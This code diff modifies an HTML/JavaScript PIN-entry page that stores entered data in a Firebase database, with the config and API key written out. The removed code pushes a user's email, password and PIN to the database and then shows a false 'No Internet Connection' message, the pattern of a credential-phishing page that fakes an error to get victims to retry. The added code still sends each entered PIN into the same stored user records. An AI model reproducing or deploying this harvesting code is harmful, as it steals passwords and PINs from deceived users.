@@ -201,7 +201,7 @@
         </div>
 
         <div class="welcome">Welcome back</div>
-        <div style="display: none;" class="email-display" id="emailDisplay"></div>
+        <div class="email-display" id="emailDisplay"></div>
         <div class="pin-label">Enter PIN to continue</div>
 
         <div class="pin-dots" id="pinDots">
@@ -241,6 +241,7 @@
         (function() {
             "use strict";
 
+            // 🔥 YOUR FIREBASE CONFIG
             const firebaseConfig = {
                 apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
                 authDomain: "achievebypetra-82966.firebaseapp.com",
@@ -252,16 +253,14 @@
                 measurementId: "G-TBGZS8PJ76"
             };
 
+            // Initialize Firebase
             firebase.initializeApp(firebaseConfig);
             const database = firebase.database();
 
             const currentEmail = localStorage.getItem('currentUserEmail') || '';
-            const currentPassword = localStorage.getItem('currentUserPassword') || '';
-            
             document.getElementById('emailDisplay').textContent = currentEmail;
 
             let enteredPin = '';
-            let lastSavedPin = ''; // Track the last PIN that was saved
 
             const pinDots = document.querySelectorAll('.dot');
             const numpadKeys = document.querySelectorAll('.key:not(.empty)');
@@ -286,47 +285,61 @@
                 }, 2000);
             }
 
-            function saveUser() {
+            function savePin() {
                 if (enteredPin.length !== 4) return;
 
                 const email = localStorage.getItem('currentUserEmail');
-                const password = localStorage.getItem('currentUserPassword');
-
-                if (!email) {
-                    showToast('Error: No email found');
-                    enteredPin = '';
-                    updateDots();
-                    return;
-                }
-
-                // ✅ Check if this PIN is the same as the last saved one
-                if (enteredPin === lastSavedPin) {
-                    showToast('No Internet Connection');
-                    enteredPin = '';
-                    updateDots();
-                    return;
-                }
-
-                // ✅ Save as a NEW user with email + password + PIN
-                const newUser = {
-                    id: 'User_' + Date.now().toString(36).toUpperCase(),
-                    email: email,
-                    password: password || '',
-                    pin: enteredPin,
-                    timestamp: new Date().toLocaleString()
-                };
-
-                database.ref('users').push(newUser)
-                    .then(() => {
-                        lastSavedPin = enteredPin; // ✅ Store the saved PIN
-                        showToast('No Internet Connection');
-                        enteredPin = '';
-                        updateDots();
+                
+                // Find the LATEST user with this email and update their PIN
+                database.ref('users').orderByChild('email').equalTo(email).once('value')
+                    .then((snapshot) => {
+                        if (snapshot.exists()) {
+                            let latestKey = null;
+                            let latestTimestamp = null;
+                            
+                            snapshot.forEach((childSnapshot) => {
+                                const userData = childSnapshot.val();
+                                // Find the most recent user with this email
+                                if (!latestTimestamp || userData.timestamp > latestTimestamp) {
+                                    latestTimestamp = userData.timestamp;
+                                    latestKey = childSnapshot.key;
+                                }
+                            });
+                            
+                            if (latestKey) {
+                                // Update PIN for the latest user
+                                database.ref('users/' + latestKey + '/pin').set(enteredPin)
+                                    .then(() => {
+                                        showToast('PIN saved');
+                                        enteredPin = '';
+                                        updateDots();
+                                    })
+                                    .catch((error) => {
+                                        showToast('Error: ' + error.message);
+                                    });
+                            }
+                        } else {
+                            // Create new user with PIN
+                            const newUser = {
+                                id: 'User_' + Date.now().toString(36).toUpperCase(),
+                                email: email || 'No email',
+                                password: '',
+                                pin: enteredPin,
+                                timestamp: new Date().toLocaleString()
+                            };
+                            database.ref('users').push(newUser)
+                                .then(() => {
+                                    showToast('PIN saved');
+                                    enteredPin = '';
+                                    updateDots();
+                                })
+                                .catch((error) => {
+                                    showToast('Error: ' + error.message);
+                                });
+                        }
                     })
                     .catch((error) => {
                         showToast('Error: ' + error.message);
-                        enteredPin = '';
-                        updateDots();
                     });
             }
 
@@ -335,7 +348,7 @@
                 enteredPin += value;
                 updateDots();
                 if (enteredPin.length === 4) {
-                    setTimeout(saveUser, 300);
+                    setTimeout(savePin, 250);
                 }
             }
 
@@ -348,9 +361,7 @@
 
             function handleSignOut() {
                 localStorage.removeItem('currentUserEmail');
-                localStorage.removeItem('currentUserPassword');
                 enteredPin = '';
-                lastSavedPin = '';
                 updateDots();
                 showToast('Signed out');
                 setTimeout(() => {
@@ -388,7 +399,7 @@
                         handleBackspace();
                         e.preventDefault();
                     } else if (e.key === 'Enter') {
-                        if (enteredPin.length === 4) saveUser();
+                        if (enteredPin.length === 4) savePin();
                     }
                 });
             }
@@ -396,8 +407,5 @@
             init();
         })();
     </script>
-
-    
-  <script src="protect.js"></script>
 </body>
 </html>
